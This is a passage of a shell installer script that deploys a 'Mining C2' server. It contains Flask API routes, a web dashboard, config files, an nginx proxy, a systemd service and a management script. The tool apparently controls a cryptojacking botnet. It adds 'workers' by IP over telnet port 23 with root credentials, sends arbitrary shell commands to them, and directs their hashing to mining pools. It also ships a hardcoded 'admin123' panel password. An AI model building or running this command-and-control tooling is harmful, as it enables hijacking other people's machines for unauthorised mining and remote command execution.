        @self.app.route('/api/pools/add', methods=['POST'])
        @login_required
        def add_pool():
            data = request.json
            
            cursor = self.c2_server.mysql.cursor()
            try:
                cursor.execute("""
                    INSERT INTO mining_pools (pool_name, pool_url, port, username, password)
                    VALUES (%s, %s, %s, %s, %s)
                """, (
                    data['pool_name'],
                    data['pool_url'],
                    data.get('port', 3333),
                    data.get('username', ''),
                    data.get('password', 'x')
                ))
                self.c2_server.mysql.commit()
                
                # Reload pools
                self.c2_server.load_pools()
                
                return jsonify({'status': 'success', 'message': 'Pool added'})
                
            except Exception as e:
                self.c2_server.mysql.rollback()
                return jsonify({'status': 'error', 'message': str(e)}), 400
            finally:
                cursor.close()
        
        @self.app.route('/api/system/status')
        @login_required
        def system_status():
            return jsonify({
                'active_connections': len(self.c2_server.active_connections),
                'total_workers': len(self.c2_server.workers),
                'uptime': 'running',
                'version': '1.0.0'
            })
        
        @self.app.route('/api/jobs/recent')
        @login_required
        def recent_jobs():
            cursor = self.c2_server.mysql.cursor(dictionary=True)
            cursor.execute("""
                SELECT j.*, w.worker_name, w.ip_address 
                FROM mining_jobs j
                JOIN mining_workers w ON j.worker_id = w.worker_id
                ORDER BY j.submitted_at DESC
                LIMIT 100
            """)
            jobs = cursor.fetchall()
            cursor.close()
            return jsonify(jobs)
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                password = request.form.get('password')
                if password == os.getenv('WEB_PASSWORD', 'admin123'):
                    session['logged_in'] = True
                    return redirect(url_for('index'))
                return '''
                    <div style="color: red; text-align: center;">Invalid password</div>
                    <form method="post" style="text-align: center; margin-top: 20px;">
                        <input type="password" name="password" placeholder="Password">
                        <button type="submit">Login</button>
                    </form>
                '''
            return '''
                <html>
                <head>
                    <title>Mining C2 Login</title>
                    <style>
                        body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
                        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
                        input { padding: 10px; width: 200px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                        button { padding: 10px 20px; background: #1a73e8; color: white; border: none; border-radius: 5px; cursor: pointer; }
                        button:hover { background: #1557b0; }
                    </style>
                </head>
                <body>
                    <div class="login-box">
                        <h2 style="text-align: center;">Mining C2 Login</h2>
                        <form method="post" style="text-align: center;">
                            <input type="password" name="password" placeholder="Enter Password" required>
                            <br>
                            <button type="submit">Login</button>
                        </form>
                    </div>
                </body>
                </html>
            '''
        
        @self.app.route('/logout')
        def logout():
            session.pop('logged_in', None)
            return redirect(url_for('login'))

async def main():
    """Main entry point"""
    
    # Create C2 server instance
    c2 = EnhancedMiningC2Server()
    
    # Start web interface
    web = WebInterface(c2)
    
    # Start web server with gunicorn in thread
    def run_web():
        from gunicorn.app.base import BaseApplication
        
        class StandaloneApplication(BaseApplication):
            def __init__(self, app, options=None):
                self.options = options or {}
                self.application = app
                super().__init__()
            
            def load_config(self):
                for key, value in self.options.items():
                    self.cfg.set(key.lower(), value)
            
            def load(self):
                return self.application
        
        options = {
            'bind': f'0.0.0.0:5000',
            'workers': 2,
            'worker_class': 'eventlet',
            'timeout': 120,
            'accesslog': '/opt/mining_c2/logs/gunicorn_access.log',
            'errorlog': '/opt/mining_c2/logs/gunicorn_error.log',
        }
        StandaloneApplication(web.app, options).run()
    
    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()
    
    logger.info("Enhanced Mining C2 Server started")
    logger.info("Web interface available at http://localhost:5000")
    
    # Connect to all workers
    await c2.connect_all_workers()
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        for worker_id in list(c2.active_connections.keys()):
            await c2.disconnect_worker(worker_id)

if __name__ == '__main__':
    asyncio.run(main())
EOF

chmod +x /opt/mining_c2/mining_c2_enhanced.py

echo "[*] Creating enhanced dashboard template..."
cat > /opt/mining_c2/templates/enhanced_dashboard.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Mining C2 Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 16px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }
        
        .stat-title {
            color: #666;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-value {
            color: #333;
            font-size: 32px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .stat-change {
            color: #28a745;
            font-size: 14px;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 12px 25px;
            background: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            color: #666;
            transition: all 0.3s;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .tab:hover {
            background: #f0f0f0;
        }
        
        .tab.active {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .panel {
            display: none;
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            margin-bottom: 25px;
        }
        
        .panel.active {
            display: block;
        }
        
        .workers-table {
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th {
            text-align: left;
            padding: 15px 10px;
            background: #f8f9fa;
            color: #333;
            font-weight: 600;
        }
        
        td {
            padding: 12px 10px;
            border-bottom: 1px solid #eee;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .status-badge {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: capitalize;
        }
        
        .status-active { background: #d4edda; color: #155724; }
        .status-mining { background: #cce5ff; color: #004085; }
        .status-inactive { background: #fff3cd; color: #856404; }
        .status-error { background: #f8d7da; color: #721c24; }
        
        .btn {
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.3s;
            margin: 0 5px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c82333;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
        }
        
        .btn-success:hover {
            background: #218838;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 600;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .alert {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: none;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .charts-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .chart-box {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: white;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .close {
            font-size: 24px;
            cursor: pointer;
            color: #666;
        }
        
        .close:hover {
            color: #333;
        }
        
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .charts-container {
                grid-template-columns: 1fr;
            }
            
            .tabs {
                flex-direction: column;
            }
            
            .tab {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 Enhanced Mining Command & Control Center</h1>
            <p>Connected to Blockchain.com Database Schema • Live Monitoring • Real-time Controls</p>
        </div>
        
        <div class="stats-grid" id="stats-grid">
            <div class="stat-card">
                <div class="stat-title">Total Workers</div>
                <div class="stat-value" id="total-workers">0</div>
                <div class="stat-change">Registered miners</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Active Mining</div>
                <div class="stat-value" id="active-workers">0</div>
                <div class="stat-change">Currently hashing</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Total Hashrate</div>
                <div class="stat-value" id="total-hashrate">0 H/s</div>
                <div class="stat-change">Combined power</div>
            </div>
            <div class="stat-card">
                <div class="stat-title">Total Shares</div>
                <div class="stat-value" id="total-shares">0</div>
                <div class="stat-change">Valid submissions</div>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="showTab('dashboard')">📊 Dashboard</button>
            <button class="tab" onclick="showTab('workers')">👥 Workers</button>
            <button class="tab" onclick="showTab('pools')">⚡ Mining Pools</button>
            <button class="tab" onclick="showTab('jobs')">📋 Recent Jobs</button>
            <button class="tab" onclick="showTab('add')">➕ Add Worker</button>
        </div>
        
        <div id="dashboard-panel" class="panel active">
            <div class="charts-container">
                <div class="chart-box">
                    <canvas id="hashrateChart"></canvas>
                </div>
                <div class="chart-box">
                    <canvas id="workersChart"></canvas>
                </div>
            </div>
            
            <div class="workers-table">
                <h3 style="margin-bottom: 15px;">Active Workers</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Worker</th>
                            <th>IP:Port</th>
                            <th>Status</th>
                            <th>Hashrate</th>
                            <th>Architecture</th>
                            <th>Cores</th>
                            <th>Last Seen</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="active-workers-table">
                        <tr><td colspan="8" style="text-align: center;">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="workers-panel" class="panel">
            <div style="margin-bottom: 20px;">
                <input type="text" id="worker-search" placeholder="Search workers..." class="form-control" style="width: 300px;">
            </div>
            <div class="workers-table">
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Worker Name</th>
                            <th>IP:Port</th>
                            <th>Status</th>
                            <th>Hashrate</th>
                            <th>Architecture</th>
                            <th>Cores/Memory</th>
                            <th>Total Shares</th>
                            <th>Last Seen</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="all-workers-table">
                        <tr><td colspan="10" style="text-align: center;">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="pools-panel" class="panel">
            <button class="btn btn-primary" onclick="showAddPoolModal()" style="margin-bottom: 20px;">➕ Add Mining Pool</button>
            <div class="workers-table">
                <table>
                    <thead>
                        <tr>
                            <th>Pool Name</th>
                            <th>URL</th>
                            <th>Port</th>
                            <th>Username</th>
                            <th>Status</th>
                            <th>Priority</th>
                        </tr>
                    </thead>
                    <tbody id="pools-table">
                        <tr><td colspan="6" style="text-align: center;">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="jobs-panel" class="panel">
            <div class="workers-table">
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Worker</th>
                            <th>IP</th>
                            <th>Job ID</th>
                            <th>Difficulty</th>
                            <th>Status</th>
                            <th>Shares</th>
                        </tr>
                    </thead>
                    <tbody id="jobs-table">
                        <tr><td colspan="7" style="text-align: center;">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>
        
        <div id="add-panel" class="panel">
            <h3 style="margin-bottom: 20px;">Add New Worker</h3>
            <form id="add-worker-form" style="max-width: 500px;">
                <div class="form-group">
                    <label>IP Address</label>
                    <input type="text" class="form-control" id="ip" required placeholder="192.168.1.100">
                </div>
                <div class="form-group">
                    <label>Port</label>
                    <input type="number" class="form-control" id="port" value="23" required>
                </div>
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" class="form-control" id="username" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <div class="form-group">
                    <label>Worker Name (optional)</label>
                    <input type="text" class="form-control" id="worker_name" placeholder="worker_1">
                </div>
                <button type="submit" class="btn btn-primary">Add Worker</button>
            </form>
        </div>
    </div>
    
    <!-- Command Modal -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Send Command to Worker</h3>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div id="command-worker-info"></div>
            <textarea id="command-text" class="form-control" rows="4" placeholder="Enter command..."></textarea>
            <div style="margin-top: 20px; text-align: right;">
                <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
                <button class="btn btn-primary" onclick="sendCommand()">Send Command</button>
            </div>
        </div>
    </div>
    
    <!-- Add Pool Modal -->
    <div id="poolModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Add Mining Pool</h3>
                <span class="close" onclick="closePoolModal()">&times;</span>
            </div>
            <form id="add-pool-form">
                <div class="form-group">
                    <label>Pool Name</label>
                    <input type="text" class="form-control" id="pool_name" required>
                </div>
                <div class="form-group">
                    <label>Pool URL</label>
                    <input type="text" class="form-control" id="pool_url" value="stratum+tcp://pool.ckpool.org" required>
                </div>
                <div class="form-group">
                    <label>Port</label>
                    <input type="number" class="form-control" id="pool_port" value="3333" required>
                </div>
                <div class="form-group">
                    <label>Username (optional)</label>
                    <input type="text" class="form-control" id="pool_username">
                </div>
                <div class="form-group">
                    <label>Password (optional)</label>
                    <input type="password" class="form-control" id="pool_password" value="x">
                </div>
                <button type="submit" class="btn btn-primary">Add Pool</button>
            </form>
        </div>
    </div>
    
    <div id="alert" class="alert"></div>
    
    <script>
        let socket;
        let hashrateChart, workersChart;
        
        $(document).ready(function() {
            // Initialize charts
            initCharts();
            
            // Load initial data
            loadStats();
            loadAllWorkers();
            loadPools();
            loadRecentJobs();
            
            // Auto-refresh every 10 seconds
            setInterval(() => {
                loadStats();
                loadActiveWorkers();
            }, 10000);
            
            // Setup form handlers
            $('#add-worker-form').submit(function(e) {
                e.preventDefault();
                addWorker();
            });
            
            $('#add-pool-form').submit(function(e) {
                e.preventDefault();
                addPool();
            });
            
            // Search functionality
            $('#worker-search').on('keyup', function() {
                filterWorkers($(this).val());
            });
        });
        
        function initCharts() {
            const ctx1 = document.getElementById('hashrateChart').getContext('2d');
            hashrateChart = new Chart(ctx1, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Total Hashrate (H/s)',
                        data: [],
                        borderColor: 'rgb(75, 192, 192)',
                        tension: 0.1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        title: {
                            display: true,
                            text: 'Network Hashrate (Last 24h)'
                        }
                    }
                }
            });
            
            const ctx2 = document.getElementById('workersChart').getContext('2d');
            workersChart = new Chart(ctx2, {
                type: 'doughnut',
                data: {
                    labels: ['Active Mining', 'Inactive', 'Error'],
                    datasets: [{
                        data: [0, 0, 0],
                        backgroundColor: ['#28a745', '#ffc107', '#dc3545']
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        title: {
                            display: true,
                            text: 'Worker Status Distribution'
                        }
                    }
                }
            });
        }
        
        function showTab(tabName) {
            $('.tab').removeClass('active');
            $(`.tab:contains('${tabName}')`).addClass('active');
            
            $('.panel').removeClass('active');
            $(`#${tabName}-panel`).addClass('active');
            
            if (tabName === 'workers') {
                loadAllWorkers();
            } else if (tabName === 'jobs') {
                loadRecentJobs();
            } else if (tabName === 'dashboard') {
                loadActiveWorkers();
            }
        }
        
        function loadStats() {
            $.get('/api/stats', function(data) {
                $('#total-workers').text(data.total_workers || 0);
                $('#active-workers').text(data.active_workers || 0);
                $('#total-hashrate').text((data.total_hashrate || 0).toFixed(2) + ' H/s');
                $('#total-shares').text(data.total_shares || 0);
            }).fail(function() {
                console.error('Failed to load stats');
            });
        }
        
        function loadActiveWorkers() {
            $.get('/api/workers', function(workers) {
                let activeWorkers = workers.filter(w => w.status === 'mining' || w.status === 'active');
                let html = '';
                
                if (activeWorkers.length === 0) {
                    html = '<tr><td colspan="8" style="text-align: center;">No active workers</td></tr>';
                } else {
                    activeWorkers.forEach(w => {
                        let lastSeen = w.last_seen ? new Date(w.last_seen).toLocaleString() : 'Never';
                        html += `
                            <tr>
                                <td>${w.worker_name || 'N/A'}</td>
                                <td>${w.ip_address}:${w.telnet_port}</td>
                                <td><span class="status-badge status-${w.status}">${w.status}</span></td>
                                <td>${w.hash_rate || 0} H/s</td>
                                <td>${w.architecture || 'Unknown'}</td>
                                <td>${w.cpu_cores || '?'}</td>
                                <td>${lastSeen}</td>
                                <td>
                                    <button class="btn btn-primary btn-sm" onclick="showCommandModal(${w.worker_id}, '${w.worker_name}')">Command</button>
                                    <button class="btn btn-success btn-sm" onclick="restartWorker(${w.worker_id})">Restart</button>
                                </td>
                            </tr>
                        `;
                    });
                }
                
                $('#active-workers-table').html(html);
            }).fail(function() {
                $('#active-workers-table').html('<tr><td colspan="8" style="text-align: center;">Failed to load workers</td></tr>');
            });
        }
        
        function loadAllWorkers() {
            $.get('/api/workers', function(workers) {
                let html = '';
                
                if (workers.length === 0) {
                    html = '<tr><td colspan="10" style="text-align: center;">No workers configured</td></tr>';
                } else {
                    workers.forEach(w => {
                        let lastSeen = w.last_seen ? new Date(w.last_seen).toLocaleString() : 'Never';
                        let memoryInfo = w.memory_mb ? `${w.memory_mb} MB` : 'Unknown';
                        
                        html += `
                            <tr>
                                <td>${w.worker_id}</td>
                                <td>${w.worker_name || 'N/A'}</td>
                                <td>${w.ip_address}:${w.telnet_port}</td>
                                <td><span class="status-badge status-${w.status}">${w.status}</span></td>
                                <td>${w.hash_rate || 0} H/s</td>
                                <td>${w.architecture || 'Unknown'}</td>
                                <td>${w.cpu_cores || '?'} / ${memoryInfo}</td>
                                <td>${w.total_shares || 0}</td>
                                <td>${lastSeen}</td>
                                <td>
                                    <button class="btn btn-primary btn-sm" onclick="showCommandModal(${w.worker_id}, '${w.worker_name}')">Cmd</button>
                                    <button class="btn btn-success btn-sm" onclick="restartWorker(${w.worker_id})">Restart</button>
                                    <button class="btn btn-danger btn-sm" onclick="disconnectWorker(${w.worker_id})">Stop</button>
                                </td>
                            </tr>
                        `;
                    });
                }
                
                $('#all-workers-table').html(html);
                
                // Update chart data
                let active = workers.filter(w => w.status === 'mining').length;
                let inactive = workers.filter(w => w.status === 'inactive').length;
                let error = workers.filter(w => w.status === 'error').length;
                
                workersChart.data.datasets[0].data = [active, inactive, error];
                workersChart.update();
                
            }).fail(function() {
                $('#all-workers-table').html('<tr><td colspan="10" style="text-align: center;">Failed to load workers</td></tr>');
            });
        }
        
        function loadPools() {
            $.get('/api/pools', function(pools) {
                let html = '';
                
                if (pools.length === 0) {
                    html = '<tr><td colspan="6" style="text-align: center;">No pools configured</td></tr>';
                } else {
                    pools.forEach(p => {
                        html += `
                            <tr>
                                <td>${p.pool_name}</td>
                                <td>${p.pool_url}</td>
                                <td>${p.port}</td>
                                <td>${p.username || 'Default'}</td>
                                <td><span class="status-badge status-${p.is_active ? 'active' : 'inactive'}">${p.is_active ? 'Active' : 'Inactive'}</span></td>
                                <td>${p.priority}</td>
                            </tr>
                        `;
                    });
                }
                
                $('#pools-table').html(html);
            }).fail(function() {
                $('#pools-table').html('<tr><td colspan="6" style="text-align: center;">Failed to load pools</td></tr>');
            });
        }
        
        function loadRecentJobs() {
            $.get('/api/jobs/recent', function(jobs) {
                let html = '';
                
                if (jobs.length === 0) {
                    html = '<tr><td colspan="7" style="text-align: center;">No recent jobs</td></tr>';
                } else {
                    jobs.forEach(j => {
                        let time = j.submitted_at ? new Date(j.submitted_at).toLocaleString() : 'Unknown';
                        html += `
                            <tr>
                                <td>${time}</td>
                                <td>${j.worker_name || 'Unknown'}</td>
                                <td>${j.ip_address || 'Unknown'}</td>
                                <td>${j.job_identifier || 'N/A'}</td>
                                <td>${j.difficulty || 'N/A'}</td>
                                <td><span class="status-badge status-${j.status}">${j.status}</span></td>
                                <td>${j.shares_difficulty || '0'}</td>
                            </tr>
                        `;
                    });
                }
                
                $('#jobs-table').html(html);
            }).fail(function() {
                $('#jobs-table').html('<tr><td colspan="7" style="text-align: center;">Failed to load jobs</td></tr>');
            });
        }
        
        function addWorker() {
            let worker = {
                ip: $('#ip').val(),
                port: parseInt($('#port').val()),
                username: $('#username').val(),
                password: $('#password').val(),
                worker_name: $('#worker_name').val() || null
            };
            
            $.ajax({
                url: '/api/workers/add',
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(worker),
                success: function(response) {
                    showAlert('Worker added successfully!', 'success');
                    $('#add-worker-form')[0].reset();
                    loadAllWorkers();
                    showTab('workers');
                },
                error: function(xhr) {
                    showAlert('Error adding worker: ' + xhr.responseJSON?.message, 'danger');
                }
            });
        }
        
        function addPool() {
            let pool = {
                pool_name: $('#pool_name').val(),
                pool_url: $('#pool_url').val(),
                port: parseInt($('#pool_port').val()),
                username: $('#pool_username').val(),
                password: $('#pool_password').val()
            };
            
            $.ajax({
                url: '/api/pools/add',
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(pool),
                success: function() {
                    showAlert('Pool added successfully!', 'success');
                    closePoolModal();
                    loadPools();
                },
                error: function(xhr) {
                    showAlert('Error adding pool: ' + xhr.responseJSON?.message, 'danger');
                }
            });
        }
        
        function showCommandModal(workerId, workerName) {
            $('#command-worker-info').html(`<p>Sending command to: <strong>${workerName || 'Worker ' + workerId}</strong></p>`);
            $('#commandModal').data('worker-id', workerId);
            $('#commandModal').addClass('active');
        }
        
        function closeModal() {
            $('#commandModal').removeClass('active');
            $('#command-text').val('');
        }
        
        function sendCommand() {
            let workerId = $('#commandModal').data('worker-id');
            let command = $('#command-text').val();
            
            if (!command) {
                showAlert('Please enter a command', 'danger');
                return;
            }
            
            $.ajax({
                url: `/api/workers/${workerId}/command`,
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ command: command }),
                success: function() {
                    showAlert('Command sent successfully!', 'success');
                    closeModal();
                },
                error: function(xhr) {
                    showAlert('Error sending command: ' + xhr.responseJSON?.message, 'danger');
                }
            });
        }
        
        function restartWorker(workerId) {
            if (confirm('Restart mining on this worker?')) {
                $.ajax({
                    url: `/api/workers/${workerId}/restart`,
                    method: 'POST',
                    success: function() {
                        showAlert('Mining restarted on worker', 'success');
                    },
                    error: function(xhr) {
                        showAlert('Error restarting: ' + xhr.responseJSON?.message, 'danger');
                    }
                });
            }
        }
        
        function disconnectWorker(workerId) {
            if (confirm('Stop mining and disconnect this worker?')) {
                $.ajax({
                    url: `/api/workers/${workerId}/command`,
                    method: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({ command: 'pkill miner; exit' }),
                    success: function() {
                        showAlert('Worker disconnected', 'success');
                        setTimeout(loadAllWorkers, 2000);
                    },
                    error: function(xhr) {
                        showAlert('Error: ' + xhr.responseJSON?.message, 'danger');
                    }
                });
            }
        }
        
        function showAddPoolModal() {
            $('#poolModal').addClass('active');
        }
        
        function closePoolModal() {
            $('#poolModal').removeClass('active');
            $('#add-pool-form')[0].reset();
        }
        
        function filterWorkers(search) {
            search = search.toLowerCase();
            $('#all-workers-table tr').each(function() {
                let text = $(this).text().toLowerCase();
                if (text.indexOf(search) > -1) {
                    $(this).show();
                } else {
                    $(this).hide();
                }
            });
        }
        
        function showAlert(message, type) {
            let alert = $('#alert');
            alert.removeClass('alert-success alert-danger').addClass(`alert-${type}`);
            alert.html(message);
            alert.show();
            
            setTimeout(() => {
                alert.hide();
            }, 5000);
        }
        
        // Close modals when clicking outside
        $(window).click(function(e) {
            if ($(e.target).hasClass('modal')) {
                $('.modal').removeClass('active');
            }
        });
    </script>
</body>
</html>
EOF

echo "[*] Creating enhanced configuration files..."
cat > /opt/mining_c2/.env << EOF
# Mining Configuration
BTC_WALLET=${BTC_WALLET}
MINING_POOL=stratum+tcp://pool.ckpool.org:3333

# Database Configuration
MYSQL_HOST=localhost
MYSQL_USER=root
MYSQL_PASSWORD=${DB_PASSWORD}
MYSQL_DB=${DB_NAME}

# Redis Configuration
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=

# Web Interface
FLASK_SECRET_KEY=$(openssl rand -hex 32)
WEB_PASSWORD=admin123
WEB_PORT=5000

# Security
ENCRYPTION_KEY=$(openssl rand -hex 32)
JWT_SECRET=$(openssl rand -hex 32)

# API Keys
BLOCKCHAIN_API_KEY=your_key_here
EOF

echo "[*] Creating worker configuration template..."
cat > /opt/mining_c2/config/workers.json << EOF
[
    {
        "ip": "192.168.1.100",
        "port": 23,
        "username": "root",
        "password": "password123",
        "worker_name": "worker_1"
    }
]
EOF

echo "[*] Setting up SSL certificates for HTTPS..."
mkdir -p /opt/mining_c2/ssl
openssl req -x509 -newkey rsa:4096 -keyout /opt/mining_c2/ssl/key.pem -out /opt/mining_c2/ssl/cert.pem -days 365 -nodes -subj "/CN=${HOSTNAME}"

echo "[*] Configuring Nginx reverse proxy..."
cat > /etc/nginx/sites-available/mining-c2 << EOF
server {
    listen ${WEB_PORT} ssl http2;
    listen [::]:${WEB_PORT} ssl http2;
    server_name ${HOSTNAME};

    ssl_certificate /opt/mining_c2/ssl/cert.pem;
    ssl_certificate_key /opt/mining_c2/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    access_log /opt/mining_c2/logs/nginx_access.log;
    error_log /opt/mining_c2/logs/nginx_error.log;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_cache_bypass \$http_upgrade;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }

    location /static {
        alias /opt/mining_c2/static;
    }
}
EOF

ln -sf /etc/nginx/sites-available/mining-c2 /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

echo "[*] Creating systemd service..."
cat > /etc/systemd/system/mining-c2.service << EOF
[Unit]
Description=Mining C2 Enhanced Server
After=network.target mariadb.service redis-server.service nginx.service
Wants=mariadb.service redis-server.service

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/opt/mining_c2
Environment=PATH=/opt/mining_c2/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
Environment=PYTHONPATH=/opt/mining_c2
ExecStart=/opt/mining_c2/venv/bin/python /opt/mining_c2/mining_c2_enhanced.py
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=mining-c2

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Creating management script..."
cat > /opt/mining_c2/manage.sh << 'EOF'
#!/bin/bash

case "$1" in
    start)
        systemctl start mariadb redis-server nginx mining-c2
        echo "Services started"
        ;;
    stop)
        systemctl stop mining-c2 nginx redis-server mariadb
        echo "Services stopped"
        ;;
    restart)
        systemctl restart mariadb redis-server nginx mining-c2
        echo "Services restarted"
        ;;
    status)
        systemctl status mariadb redis-server nginx mining-c2
        ;;
    logs)
        journalctl -u mining-c2 -f
        ;;
    add-worker)
        if [ $# -lt 5 ]; then
            echo "Usage: $0 add-worker IP PORT USERNAME PASSWORD [WORKER_NAME]"
            exit 1
        fi
        python3 -c "
import json
import sys
from pathlib import Path

config_file = Path('/opt/mining_c2/config/workers.json')
workers = []
if config_file.exists():
    with open(config_file, 'r') as f:
        workers = json.load(f)

new_worker = {
    'ip': '$2',
    'port': int('$3'),
    'username': '$4',
    'password': '$5',
    'worker_name': '$6' if len(sys.argv) > 6 else f'worker_$2'
}
workers.append(new_worker)

with open(config_file, 'w') as f:
    json.dump(workers, f, indent=4)
print(f'Added worker $2')
"
        systemctl restart mining-c2
        ;;
    list-workers)
        python3 -c "
import json
from pathlib import Path
